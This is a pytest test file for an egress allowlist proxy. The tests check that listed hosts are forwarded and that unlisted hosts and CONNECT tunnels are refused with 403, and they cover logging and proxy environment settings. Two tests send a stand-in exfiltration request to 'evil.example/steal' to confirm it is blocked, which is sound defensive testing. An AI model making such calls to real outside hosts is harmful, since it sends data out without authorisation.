"""The proxy is the evidence that code stayed on the machine, so test it over a socket."""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator

import httpx
import pytest

from reviewrig.net import Allowlist, EgressProxy


@pytest.fixture
async def origin() -> AsyncIterator[tuple[str, int]]:
    """A plain HTTP server that stands in for a model server."""

    async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        await reader.readuntil(b"\r\n\r\n")
        body = b"upstream"
        writer.write(
            b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
            % (len(body), body)
        )
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    async with server:
        yield "127.0.0.1", port


@pytest.fixture
async def proxy(origin: tuple[str, int]) -> AsyncIterator[EgressProxy]:
    allowlist = Allowlist.from_values([f"http://{origin[0]}:{origin[1]}"])
    proxy = EgressProxy(allowlist)
    await proxy.start()
    yield proxy
    await proxy.stop()


async def test_it_forwards_a_listed_destination(
    proxy: EgressProxy, origin: tuple[str, int]
) -> None:
    async with httpx.AsyncClient(proxy=proxy.url, timeout=10) as client:
        response = await client.get(f"http://{origin[0]}:{origin[1]}/v1/models")
    assert response.status_code == 200
    assert response.text == "upstream"
    assert proxy.stats.allowed == 1


async def test_it_refuses_an_unlisted_destination(proxy: EgressProxy) -> None:
    async with httpx.AsyncClient(proxy=proxy.url, timeout=10) as client:
        response = await client.get("http://evil.example/steal")
    assert response.status_code == 403
    assert b"not on the allowlist" in response.content
    assert proxy.stats.refused == 1
    assert proxy.stats.refused_hosts == ["evil.example:80"]


async def test_it_refuses_a_connect_to_an_unlisted_destination(proxy: EgressProxy) -> None:
    """An https client asks for a tunnel first. The refusal must land there."""
    reader, writer = await asyncio.open_connection("127.0.0.1", proxy.port)
    writer.write(b"CONNECT api.openai.com:443 HTTP/1.1\r\nHost: api.openai.com:443\r\n\r\n")
    await writer.drain()
    status = await reader.readline()
    writer.close()
    assert b"403" in status
    assert proxy.stats.refused == 1


async def test_it_opens_a_tunnel_to_a_listed_destination(
    proxy: EgressProxy, origin: tuple[str, int]
) -> None:
    reader, writer = await asyncio.open_connection("127.0.0.1", proxy.port)
    writer.write(f"CONNECT {origin[0]}:{origin[1]} HTTP/1.1\r\n\r\n".encode())
    await writer.drain()
    assert b"200" in await reader.readline()
    assert await reader.readline() == b"\r\n"
    writer.write(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    await writer.drain()
    assert b"upstream" in await reader.read()
    writer.close()


async def test_a_refusal_is_logged_with_a_reason(
    proxy: EgressProxy, capsys: pytest.CaptureFixture[str]
) -> None:
    async with httpx.AsyncClient(proxy=proxy.url, timeout=10) as client:
        await client.get("http://evil.example/steal")
    error = capsys.readouterr().err
    assert '"reason": "not_allowlisted"' in error
    assert '"destination": "evil.example:80"' in error


async def test_a_transfer_is_logged_with_its_size(
    proxy: EgressProxy, origin: tuple[str, int], capsys: pytest.CaptureFixture[str]
) -> None:
    async with httpx.AsyncClient(proxy=proxy.url, timeout=10) as client:
        await client.get(f"http://{origin[0]}:{origin[1]}/v1/models")
    out = capsys.readouterr().out
    assert '"message": "egress allowed"' in out
    assert '"received_bytes"' in out


async def test_a_listed_but_dead_destination_reports_a_gateway_error(
    origin: tuple[str, int],
) -> None:
    dead = Allowlist.from_values(["http://127.0.0.1:1"])
    proxy = EgressProxy(dead)
    await proxy.start()
    try:
        async with httpx.AsyncClient(proxy=proxy.url, timeout=10) as client:
            response = await client.get("http://127.0.0.1:1/")
        assert response.status_code == 502
        assert proxy.stats.failed == 1
    finally:
        await proxy.stop()


async def test_the_proxy_environment_points_at_it(proxy: EgressProxy) -> None:
    """A subprocess such as a forge tool reads these, so its traffic meets the same list."""
    environment = proxy.proxy_env()
    assert environment["HTTPS_PROXY"] == proxy.url
    assert environment["NO_PROXY"] == ""
